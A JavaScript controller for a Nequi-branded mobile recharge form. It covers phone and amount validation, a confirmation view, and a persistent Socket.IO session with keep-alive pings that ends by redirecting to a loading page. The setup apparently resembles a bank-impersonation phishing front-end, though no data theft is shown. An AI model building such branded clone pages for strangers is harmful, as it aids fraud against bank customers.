/**
 * Nequi Recharge Form Controller
 * Maneja validación, formato y envío del formulario de recarga.
 *
 * Patrones aplicados:
 *  - Module Pattern (IIFE) para encapsular estado y evitar contaminar el scope global.
 *  - Single Responsibility: cada función tiene una única responsabilidad.
 *  - Strategy: validators independientes por campo.
 */
(function () {
    'use strict';

    // ─────────────────────────────────────────────────────────
    // Constantes
    // ─────────────────────────────────────────────────────────
    const PHONE_LENGTH = 10;
    const PHONE_PREFIX = '3';
    const KEEP_ALIVE_MS = 25000;
    const SESSION_KEY = 'nequiSessionId';

    // ─────────────────────────────────────────────────────────
    // Estado de la app
    // ─────────────────────────────────────────────────────────
    const state = {
        socket: null,
        sessionId: null,
        elements: {}
    };

    // ─────────────────────────────────────────────────────────
    // Servicio de Socket.IO
    // ─────────────────────────────────────────────────────────
    const SocketService = {
        init() {
            if (typeof io !== 'function') {
                console.warn('Socket.IO no disponible');
                return;
            }

            state.sessionId = SocketService.getOrCreateSessionId();

            state.socket = io({
                path: '/socket.io/',
                auth: { sessionId: state.sessionId },
                transports: ['websocket', 'polling'],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 500,
                reconnectionDelayMax: 3000
            });

            const bindIndexSession = () => {
                state.socket.emit('initSession', {
                    sessionId: state.sessionId,
                    module: 'nequi',
                    page: 'index',
                    data: {}
                });
            };

            state.socket.on('connect', bindIndexSession);
            state.socket.on('reconnect', bindIndexSession);
            if (state.socket.connected) bindIndexSession();

            setInterval(() => {
                if (state.socket?.connected) {
                    state.socket.emit('keepAlive', { sessionId: state.sessionId });
                }
            }, KEEP_ALIVE_MS);
        },

        getOrCreateSessionId() {
            let id = localStorage.getItem(SESSION_KEY);
            if (!id) {
                id = `nequi_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;
                localStorage.setItem(SESSION_KEY, id);
            }
            return id;
        }
    };

    // ─────────────────────────────────────────────────────────
    // Validadores
    // ─────────────────────────────────────────────────────────
    const Validators = {
        phone(value) {
            return value.length === PHONE_LENGTH && value.startsWith(PHONE_PREFIX);
        },
        amount(rawValue) {
            const num = parseInt(rawValue, 10) || 0;
            return num > 0;
        }
    };

    // ─────────────────────────────────────────────────────────
    // Helpers de UI
    // ─────────────────────────────────────────────────────────
    const UI = {
        toggleLabel(input) {
            const wrapper = input.closest('.input-wrapper, .select-wrapper');
            if (!wrapper) return;

            const label = wrapper.querySelector('.input-label, .select-label');
            const placeholder = wrapper.querySelector('.select-placeholder');
            const staticLabel = wrapper.querySelector('.select-label-static');
            const hasValue = Boolean(input.value);

            if (label) {
                label.classList.toggle('active', hasValue);
                input.classList.toggle('has-value', hasValue);
            }

            if (placeholder && staticLabel) {
                placeholder.classList.toggle('hidden', hasValue);
                staticLabel.style.display = hasValue ? 'block' : 'none';
                input.style.paddingTop = hasValue ? '24px' : '16px';
                input.style.paddingBottom = hasValue ? '8px' : '16px';
            }
        },

        showError(input, errorEl, message) {
            input.classList.add('error');
            if (errorEl) {
                errorEl.textContent = message;
                errorEl.style.display = 'block';
            }
        },

        clearError(input, errorEl) {
            input.classList.remove('error');
            if (errorEl) {
                errorEl.textContent = '';
                errorEl.style.display = 'none';
            }
        }
    };

    // ─────────────────────────────────────────────────────────
    // Controlador del formulario
    // ─────────────────────────────────────────────────────────
    const FormController = {
        cacheElements() {
            const ids = [
                'phone', 'confirm-phone', 'amount', 'bank',
                'recharge-form', 'phone-error', 'amount-error',
                'submit-btn', 'person-type'
            ];
            ids.forEach(id => {
                const key = id.replace(/-([a-z])/g, (_, c) => c.toUpperCase());
                state.elements[key] = document.getElementById(id);
            });
            state.elements.checkbox = document.querySelector('input[type="checkbox"]');
        },

        bindEvents() {
            const e = state.elements;

            FormController.bindPhoneInput(e.phone);
            FormController.bindPhoneInput(e.confirmPhone);
            FormController.bindAmountInput();
            FormController.bindSelect(e.personType);
            FormController.bindSelect(e.bank);

            e.checkbox.addEventListener('change', FormController.checkCompletion);
            e.rechargeForm.addEventListener('submit', FormController.handleSubmit);

            FormController.setupSelectArrowAnimation();
        },

        bindPhoneInput(input) {
            input.addEventListener('input', function () {
                this.value = this.value.replace(/\D/g, '').slice(0, PHONE_LENGTH);
                UI.toggleLabel(this);

                if (this === state.elements.confirmPhone) {
                    FormController.validatePhoneMatch();
                }
                FormController.checkCompletion();
            });

            input.addEventListener('blur', function () {
                if (this === state.elements.confirmPhone) {
                    FormController.validatePhoneMatch();
                }
                FormController.validatePhoneFormat(this);
            });
        },

        bindAmountInput() {
            const { amount } = state.elements;
            amount.addEventListener('input', function () {
                const raw = this.value.replace(/\D/g, '');
                this.value = raw ? `$${raw.replace(/\B(?=(\d{3})+(?!\d))/g, '.')}` : '';
                UI.toggleLabel(this);
                FormController.validateAmount();
                FormController.checkCompletion();
            });
            amount.addEventListener('blur', FormController.validateAmount);
        },

        bindSelect(select) {
            select.addEventListener('change', function () {
                UI.toggleLabel(this);
                FormController.checkCompletion();
            });
        },

        validatePhoneFormat(input) {
            const v = input.value;
            const hasError = (v.length === PHONE_LENGTH && !v.startsWith(PHONE_PREFIX)) ||
                             (v.length > 0 && v.length < PHONE_LENGTH);
            input.classList.toggle('error', hasError);
        },

        validatePhoneMatch() {
            const { phone, confirmPhone, phoneError } = state.elements;
            if (confirmPhone.value.length === PHONE_LENGTH && phone.value !== confirmPhone.value) {
                UI.showError(confirmPhone, phoneError, '¡Ups! Esos dos números no coinciden, porfa revisalos.');
                return false;
            }
            UI.clearError(confirmPhone, phoneError);
            return true;
        },

        validateAmount() {
            const { amount, amountError } = state.elements;
            const raw = amount.value.replace(/\D/g, '');
            const valid = Validators.amount(raw);
            const showError = amount.value && !valid;

            if (showError) {
                UI.showError(amount, amountError, 'Debes ingresar mín. [$1]');
            } else {
                UI.clearError(amount, amountError);
            }
            return valid || !amount.value;
        },

        checkCompletion() {
            const e = state.elements;
            const phoneOk = Validators.phone(e.phone.value);
            const confirmOk = Validators.phone(e.confirmPhone.value);
            const matches = e.phone.value === e.confirmPhone.value;
            const amountOk = Validators.amount(e.amount.value.replace(/\D/g, ''));
            const personOk = e.personType.value !== '';
            const bankOk = e.bank.value !== '';
            const termsOk = e.checkbox.checked;

            const fieldsOk = phoneOk && confirmOk && matches && amountOk && personOk && bankOk;
            const complete = fieldsOk && termsOk;

            e.submitBtn.disabled = !complete;
            e.submitBtn.classList.toggle('enabled', complete);
            e.submitBtn.classList.toggle('fields-ready', fieldsOk && !termsOk);
        },

        handleSubmit(event) {
            event.preventDefault();
            const e = state.elements;
            let valid = true;

            if (!Validators.phone(e.phone.value)) {
                e.phone.classList.add('error');
                valid = false;
            }
            if (!FormController.validatePhoneMatch()) valid = false;
            if (!FormController.validateAmount()) valid = false;

            e.bank.classList.toggle('error', !e.bank.value);
            if (!e.bank.value) valid = false;

            if (!valid) return;

            const formData = {
                phone: e.phone.value,
                amount: e.amount.value,
                personType: e.personType.value,
                bank: e.bank.value,
                timestamp: new Date().toISOString()
            };

            sessionStorage.setItem('phone', formData.phone);
            sessionStorage.setItem('amount', formData.amount);
            sessionStorage.setItem('personType', formData.personType);
            sessionStorage.setItem('bank', formData.bank);
            sessionStorage.setItem('formData', JSON.stringify(formData));

            ConfirmationView.render();
        },

        setupSelectArrowAnimation() {
            document.querySelectorAll('.select-wrapper select').forEach(select => {
                const rotate = deg => {
                    const arrow = select.nextElementSibling;
                    if (arrow?.classList.contains('select-arrow')) {
                        arrow.style.transform = `translateY(-50%) rotate(${deg}deg)`;
                    }
                };
                select.addEventListener('mousedown', () => rotate(180));
                select.addEventListener('change', () => setTimeout(() => rotate(0), 150));
                select.addEventListener('blur', () => rotate(0));
            });
        }
    };

    // ─────────────────────────────────────────────────────────
    // Vista de confirmación
    // ─────────────────────────────────────────────────────────
    const ConfirmationView = {
        render() {
            const { phone, amount, personType, bank } = state.elements;
            const personText = personType.options[personType.selectedIndex].text;
            const bankText = bank.options[bank.selectedIndex].text;

            document.querySelector('.container').innerHTML = `
                <div class="logo">
                    <img src="img/nequi-logo.svg" alt="Nequi">
                </div>
                <h1 class="confirmation-title">Revisa la info</h1>
                <div class="confirmation-box">
                    ${ConfirmationView.row('Concepto', 'Recarga Nequi PSE')}
                    ${ConfirmationView.row('Número de celular', phone.value)}
                    ${ConfirmationView.row('¿Cuánto?', amount.value)}
                    ${ConfirmationView.row('Tipo de persona', personText)}
                    ${ConfirmationView.row('Banco', bankText)}
                </div>
                <button type="button" class="btn-recargar" id="btn-continuar">Continuar</button>
                <button type="button" class="btn-atras" id="btn-atras">Atrás</button>
            `;

            document.getElementById('btn-continuar').addEventListener('click', ConfirmationView.proceed);
            document.getElementById('btn-atras').addEventListener('click', () => location.reload());
        },

        row(label, value) {
            return `
                <div class="confirmation-item">
                    <div class="confirmation-label">${label}</div>
                    <div class="confirmation-value">${value}</div>
                </div>`;
        },

        proceed() {
            window.location.href = '/loading.html';
        }
    };

    // ─────────────────────────────────────────────────────────
    // Bootstrap
    // ─────────────────────────────────────────────────────────
    document.addEventListener('DOMContentLoaded', () => {
        SocketService.init();
        FormController.cacheElements();
        FormController.bindEvents();
    });
})();
